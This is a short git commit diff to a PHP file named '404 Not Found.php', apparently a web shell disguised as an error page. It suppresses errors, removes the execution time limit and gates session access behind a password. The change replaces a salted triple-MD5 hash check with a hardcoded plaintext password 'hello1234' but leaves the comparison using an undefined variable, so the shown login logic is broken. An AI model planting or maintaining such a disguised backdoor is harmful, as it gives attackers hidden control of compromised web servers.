fa72f86f3e8e824cd1507648df3ed40418d13981
ranjeetkohiliyal <58361312+ranjeetkohiliyal@users.noreply.github.com>
2019-12-13 00:16:51 +0530

    Update 404 Not Found.php

--- Php/404 Not Found.php
+++ Php/404 Not Found.php
@@ -2,12 +2,8 @@
 @session_start();
 @set_time_limit(0); 
 @error_reporting(0);
-$salt = "silic1234";
-$psw = trim($_POST['pass']);
-$pass = $salt.$psw;
-$pass = md5(md5(md5($pass)));
 $chk_login = 1;
-$password = "8f841a9b44b0167db6056389e0106af4";
+$password = "hello1234";
 if($pass == $password)
 {
 $_SESSION['ses'] = "$pass";
